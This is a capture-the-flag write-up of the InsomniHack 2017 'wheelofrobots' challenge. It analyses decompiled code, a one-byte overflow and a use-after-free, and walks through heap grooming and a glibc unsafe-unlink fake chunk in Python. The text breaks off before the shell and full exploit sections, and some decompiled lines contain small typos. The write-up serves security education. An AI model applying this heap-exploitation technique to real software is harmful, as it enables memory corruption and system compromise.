+            class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]
+            
+            ">
+            
+              <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#wheelofrobots">wheelofrobots</a>
+      <ul>
+        <li><a href="#protections">Protections</a></li>
+        <li><a href="#program-code">Program Code</a>
+          <ul>
+            <li><a href="#add-robot-function">add robot function</a></li>
+            <li><a href="#a-vulnerability">A Vulnerability</a></li>
+            <li><a href="#remove-robot-function">remove robot function</a></li>
+            <li><a href="#another-vulnerability">Another Vulnerability</a></li>
+            <li><a href="#change-robot-name-function">change robot name function</a></li>
+            <li><a href="#start-the-wheel-function">start the wheel function</a></li>
+          </ul>
+        </li>
+        <li><a href="#exploitation">Exploitation</a>
+          <ul>
+            <li><a href="#getting-a-heap-overflow">Getting a Heap Overflow</a></li>
+            <li><a href="#unsafe-unlink-attack">unsafe unlink attack</a></li>
+          </ul>
+        </li>
+        <li><a href="#popping-a-shell">Popping a shell</a></li>
+        <li><a href="#full-exploit-code">Full Exploit Code</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#wheelofrobots">wheelofrobots</a>
+      <ul>
+        <li><a href="#protections">Protections</a></li>
+        <li><a href="#program-code">Program Code</a>
+          <ul>
+            <li><a href="#add-robot-function">add robot function</a></li>
+            <li><a href="#a-vulnerability">A Vulnerability</a></li>
+            <li><a href="#remove-robot-function">remove robot function</a></li>
+            <li><a href="#another-vulnerability">Another Vulnerability</a></li>
+            <li><a href="#change-robot-name-function">change robot name function</a></li>
+            <li><a href="#start-the-wheel-function">start the wheel function</a></li>
+          </ul>
+        </li>
+        <li><a href="#exploitation">Exploitation</a>
+          <ul>
+            <li><a href="#getting-a-heap-overflow">Getting a Heap Overflow</a></li>
+            <li><a href="#unsafe-unlink-attack">unsafe unlink attack</a></li>
+          </ul>
+        </li>
+        <li><a href="#popping-a-shell">Popping a shell</a></li>
+        <li><a href="#full-exploit-code">Full Exploit Code</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+
+            
+            
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+
+
+        <div class="article-content max-w-prose mb-20">
+          <p>Wheelofrobots is a pwn challenge in InsomniHack’s 2017 CTF. This challenge involved adding, removing, and changing names of 6 different robots and spinning a wheel in which the program then exits.</p>
+
+<h2 class="relative group">wheelofrobots 
+    <div id="wheelofrobots" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#wheelofrobots" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Protections 
+    <div id="protections" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#protections" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<pre tabindex="0"><code>Arch: amd64-64-little
+RELRO: Partial RELRO
+Stack: Canary found
+NX: NX enabled
+PIE: No PIE (0x400000)
+</code></pre>
+<h3 class="relative group">Program Code 
+    <div id="program-code" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#program-code" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Upon running the program, we get this:</p>
+<img src="./Images/wor.jpeg" alt="Wheel of robots ascii art" style="display:block; margin:auto;">
+<p>So we can add robots, delete robots, change robot names, and start the wheel of robots.</p>
+
+<h4 class="relative group">add robot function 
+    <div id="add-robot-function" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#add-robot-function" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>Looking at the function that adds robots, it takes input using read into a char[4] global variable buffer that is zeroed out before reading input.</p>
+<img src="./Images/add_robot.jpeg" alt="List of robots to add" style="display:block; margin:auto;">
+<img src="./Images/input_ghidra.jpeg" alt="4 byte input buffer" style="display:block; margin:auto;">
+<p>So we can choose from the six robots which one to add. The program just reads our input and if its a number from 1-6 and we havent exceeded 3 added robots, it will add the robot by turning on the global flag for that robot, set the malloc pointer to the robot’s global malloc pointer, and increment the number of robots by 1. It will also set the data of the chunk to the name of the robot which we will be able to change later.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">total_robots</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="n">input_num</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">tinny_tim_added</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">calloc_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="err">×</span><span class="mi">14</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">tinny_tim_added</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">tim_calloc_ptr</span> <span class="o">=</span> <span class="n">calloc_ptr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="cm">/* Tonny Tom */</span>
+</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="n">calloc_ptr</span> <span class="o">=</span> <span class="mh">0x69542079666954</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">undefined2</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">calloc_ptr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">109</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">total_robots</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
+</span></span></code></pre></div><p>Some robots have special attributes, allowing us to choose how much we want to malloc for a robot with an attribute:</p>
+<ul>
+<li>Bender has intelligence that we can choose to be a value from 1-4 otherwise its 2</li>
+<li>Robot Devil has cruelty that we can choose to be a value from 1-99 otherwise its 20</li>
+<li>Destructor has powerful that we can choose to be any value &gt; 0</li>
+</ul>
+<p>These values will be multiplied by 0x14 as the value to calloc. So the chunk sizes that each robot calloc can be are:</p>
+<ul>
+<li>Tinny Tim: 0x20</li>
+<li>Bender: 0x20 - 0x60</li>
+<li>Robot Devil: 0x20 - 0x7d0</li>
+<li>Chainsmoker: 0xfa0</li>
+<li>Billionaire Bot: 0x9c40</li>
+<li>Destructor: Any size</li>
+</ul>
+
+<h4 class="relative group">A Vulnerability 
+    <div id="a-vulnerability" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#a-vulnerability" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>But in the function that adds robots only, it reads in input for 5 characters into a buffer that is 4 characters long, so we get a 1 byte overflow into the global variable that is below it in memory. Many global variables are in this program including which are these in this order:</p>
+<ul>
+<li>The calloc pointer for each robot</li>
+<li>The input buffer</li>
+<li>Flags for each robot that indicates the robot has been added</li>
+<li>Total robots added variable</li>
+<li>The special attributes for each robot</li>
+</ul>
+<p>Conveniently, the global variable immediately after the input buffer is the flag for bender, so we can artificially set whether bender has been added or not which will be very important for later</p>
+<img src="./Images/input_ghidra2.jpeg" alt="bender flag is directly after input buffer" style="display:block; margin:auto;">
+
+<h4 class="relative group">remove robot function 
+    <div id="remove-robot-function" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#remove-robot-function" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>This function is relatively simple as it just takes input and if it is a number from 1-6 it will attempt to remove the robot by decrementing the total robot global variable, freeing the calloc pointer, and turning off the flag indicating that the robot is no longer added. But we can’t just remove any robot whenever since the program actually checks each robot’s flag to check if they are added. If the robot is not currently added, then nothing will happen and the robot will not be removed and if the robot is added it will remove it. And since we can change bender’s flag artificially, we can remove him whenever.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined4</span> <span class="n">input_num</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">print_robot_names</span> <span class="p">(</span><span class="s">&#34;Which robot do you want to remove from the wheel?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Your choice :&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">memset</span> <span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">input_num</span> <span class="o">=</span> <span class="nf">read_input</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span> <span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">switch</span><span class="p">(</span><span class="n">input_num</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">tinny_tim_added</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">tim_calloc_ptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">tinny_tim_added</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">total_robots</span> <span class="o">+=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">bender_added</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">bender_calloc_ptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bender_added</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">total_robots</span> <span class="o">+=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
+</span></span></code></pre></div>
+<h4 class="relative group">Another Vulnerability 
+    <div id="another-vulnerability" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#another-vulnerability" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>The calloc pointer for each robot is freed but never NULLed out which I did not catch on the first time reading this function. So the global pointers will still have references to the places in the heap where the calloc pointer once was, which is also another important part of solving this challenge.</p>
+
+<h4 class="relative group">change robot name function 
+    <div id="change-robot-name-function" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#change-robot-name-function" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>Another relatively simple function. All it does is take input and if the value is between 1-6 we will be able to change the data at the calloc pointer for each corresponding robot. The amount we can write into the chunk is determined by the special attribute of the robot if it has one, otherwise its the static value so we cannot write more than we allocated</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined4</span> <span class="n">robot_name_input</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">print_robot_names</span><span class="p">(</span><span class="s">&#34;Which robot</span><span class="se">\&#39;</span><span class="s">s name do you want to change?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Your choice :&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">memset</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span> <span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">robot_name_input</span> <span class="o">=</span> <span class="nf">read_input</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">switch</span><span class="p">(</span><span class="n">robot_name_input</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">tinny_tim_added</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Robot</span><span class="se">\&#39;</span><span class="s">s name: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">tim_calloc_ptr</span><span class="p">,</span><span class="mh">0x14</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">bender_added</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Robot</span><span class="se">\&#39;</span><span class="s">s name: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">bender_calloc_ptr</span><span class="p">,</span> <span class="n">bender_intelligence</span> <span class="o">*</span> <span class="mh">0x14</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
+</span></span></code></pre></div><p>There is no vulnerability here.</p>
+
+<h4 class="relative group">start the wheel function 
+    <div id="start-the-wheel-function" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#start-the-wheel-function" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>First this function checks whether total_robots &lt; 3 and returns if it isnt. Then the  function will generate a random value between 1-6 using urandom. It then enters a switch statement.</p>
+<p>If the random value is 1 it checks if bender is added and if not, it prints out the string at tim’s calloc pointer which will just be tinny tim if the name was not changed.</p>
+<ul>
+<li>
+<p>If the value is 2, it does nothing</p>
+</li>
+<li>
+<p>If the value is 3-6 it will goto a specific part of a nested chain of if statements.</p>
+</li>
+<li>
+<p>The default action is to print ascii art of a demon and exits.</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">rand_val</span> <span class="o">=</span> <span class="nf">random_modulus</span> <span class="p">(</span><span class="mi">6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">switch</span> <span class="p">(</span><span class="n">rand_val</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="k">default</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">switchD_00401674_caseD_0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">bender_added</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">print_fry</span><span class="p">(</span><span class="n">tim_calloc_ptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LAB_00401720</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">switchD_00401674_caseD_3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">switchD_00401674_caseD_4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">switchD_00401674_caseD_5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">6</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">switchD_00401674_caseD_6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="err">｝</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">bender_added</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nl">switchD_00401674_caseD_3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">devil_added</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nl">switchD_00401674_caseD_4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">chainsmoker_added</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nl">switchD_00401674_caseD_5</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">billionaire_bot_added</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nl">switchD_00401674_caseD_6</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">destructor_added</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nl">switchD_00401674_caseD_0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="nf">print_demon</span><span class="p">(</span><span class="s">&#34; AH AH AH Welcome in Robot Hell!! &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span></code></pre></div><p>The nested if statements just go through the list of the 6 robots until it finds one where the flag is turned on. Once it finds one where it&rsquo;s on, it prints ascii art of Fry from Futurama with the string at the calloc pointer for the specific bot.</p>
+<p>So if the random number was 4, the program would then check if chainsmoker is added and if it is then it prints its chunk data, if not it checks billionaire bot, if not it checks destructor and if none are added it will print the demon. So it simulates spinning a wheel. The only exception to this is the first line where it checks if bender is added as the first if statement in the nested conditionals. If the program sees that bender is added, it will actually print ascii art of Bender from Furutrama and no data is printed which only happens if the random value is 2 and bender is added.</p>
+<p>After spinning the wheel, the program terminates.</p>
+
+<h3 class="relative group">Exploitation 
+    <div id="exploitation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#exploitation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>So we have a 1 byte buffer overflow allowing us to artificially turn on benders flag when we add a robot and the calloc pointers of robots are not NULLed out allowing for a use after free which are saved as global pointers.</p>
+<p>This sounds like an unsafe unlink attack. Most of the requirements are met.</p>
+<ul>
+<li>This attack works best on heap pointers that are global variables since we will be able to begin writing data at the address of that pointer.</li>
+<li>Pointers are not NULL/ zeroed out</li>
+<li>Chunks need to be adjacent to the top chunk to consolidate</li>
+<li>Need to be able to change the metadata of another chunk</li>
+</ul>
+<p>The only one we are missing is being able to overwrite the metadata of another chunk which will be difficult since the program does a good job of only being able to write how much we allocated, but the UAF will help get around this.</p>
+
+<h4 class="relative group">Getting a Heap Overflow 
+    <div id="getting-a-heap-overflow" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#getting-a-heap-overflow" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>Since the pointers are not NULLed out, we can calloc a chunk so that upon another calloc, that new chunk address will be immediately after it in memory. Then free the two chunks and calloc a slightly larger chunk than the first so that the pointer of the second calloc that was made will point near the end of the new slightly larger chunk, allowing us to overwrite the metadata of the next chunk we allocate since the program will believe that where we would be writing to would be the start of a chunk when it&rsquo;s actually near the end.</p>
+<p>It&rsquo;s important to note that the first chunk must be greater than the tcache max size or else it won&rsquo;t consolidate which means the first chunk in the unlink attack must be greater than 0x410.</p>
+<p>So first we calloc the destructor bot with a size greater than 0x410. I set destructor’s powerful value to 53 because 53 * 0x14 = 0x424</p>
+<p><code>add_bot('6', '53')</code></p>
+<p>Then I add the bender bot with the max intelligence value of 4 (0x60 size) since I want to make sure I’ll be able to reach the metadata when overwriting it. This also initializes the bender pointer to this spot in memory.</p>
+<p><code>add_bot('2', '4')</code></p>
+<p>Then I remove destructor which puts the chunk in the unsorted bin and then remove bender to put it into the fastbin. The order of freeing doesn’t matter since freeing a fastbin on its own next to the top chunk will not consolidate it.</p>
+<p><code>remove_bot('6')</code></p>
+<p><code>remove_bot('2')</code></p>
+<p>Now I need a way to remove these two chunks from the heap, so I add the chainsmoker bot which has a fixed size of 0xfa0 which is greater than the two chunks calloced earlier, causing the heap allocator to merge these two chunks together and add the remaining from the top chunk as one entire chunk. So this is combining two smaller chunks into one bigger one. I&rsquo;m also setting the bender flag on here since the bender bot is now freed but I want to still be able to write at its address. <a
+  href="https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/"
+    target="_blank"
+  >This “consolidation” stage occurs whenever a malloc request is made that is larger than a fastbin can service (i.e., for chunks over 512 bytes or 1024 bytes on 64-bit)</a>
+</p>
+<p><code>add_bot('4\x00\x00\x00\x01')</code></p>
+<p>Now since the chainsmoker bot is next to the top chunk and its size is greater than tcache max size, the heap allocator will consolidate it when we free it and merge it back with the top chunk. So now we’ve cleared out all the chunks in the heap.</p>
+<p><code>remove_bot('4')</code></p>
+<p>Now I calloc devil bot at a slightly larger size than the destructor bot from before so that the bender pointer will be pointing at the end of this chunk.</p>
+<p><code>add_bot('3', '55')</code></p>
+<p>Then I add destructor bot again with the same size as devil, this is the chunk who’s metadata will be overwritten. It is important that this chunk is greater than the tcache max size otherwise the heap allocator will not unlink the chunks.</p>
+<p><code>add_bot('6', '55')</code></p>
+<p>Now we have a pointer near the end of a chunk which will allow us to overwrite the metadata of another chunk. And since I flipped the flag for bender, the program thinks that bender is added and will allow me to write data at that location. So now we need to craft the fake chunk for the unsafe unlink.</p>
+
+<h4 class="relative group">unsafe unlink attack 
+    <div id="unsafe-unlink-attack" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#unsafe-unlink-attack" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>The two chunks currently in the heap are at sizes 0x460, so I will craft my fake chunk to be 0x450 since I want the heap allocator to consolidate backwards and unlink my fake chunk. So I create fake_chunk_metadata and fill it with the necessary metadata and write it to devil bot’s chunk. I chose the address of devil bots address 0x00603100 but any of the global variables could work. It would actually be better to use 0x006030f8 since you would be able to overwrite chainsmoker’s pointer making the chances at the wheel spin better.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">fake_chunk_metadata</span>   <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span>		    <span class="c1"># filler</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_chunk_metadata</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000451</span><span class="p">)</span>			<span class="c1"># fake_chunk size</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_chunk_metadata</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00603100</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">)</span>	<span class="c1"># P-&gt;fd-&gt;bk = P</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_chunk_metadata</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00603100</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>	<span class="c1"># P-&gt;bk-&gt;fd = P</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">change_name</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="n">fake_chunk_metadata</span><span class="p">)</span>
+</span></span></code></pre></div><p>0x00603100 is the address of devil bot’s global calloc pointer. The fd needs to be the global pointer - 0x18 and the bk needs to be the global pointer = 0x10 so that we pass the security check in glibc that would prevent this from working with other memory addresses. The prev_in_use flag for the fake chunk size does not need to be set in order for the attack to work.</p>
+<p>Then I craft the footer of the fake chunk which I will write to bender. The prev size needs to be set as the size of the fake chunk. Then the prev_in_use flag of the next chunk needs to be turned off for the unlink to work since it will see that this chunk says that the chunk before it (our fake chunk is free) and will unlink both this and the fake chunk.</p>
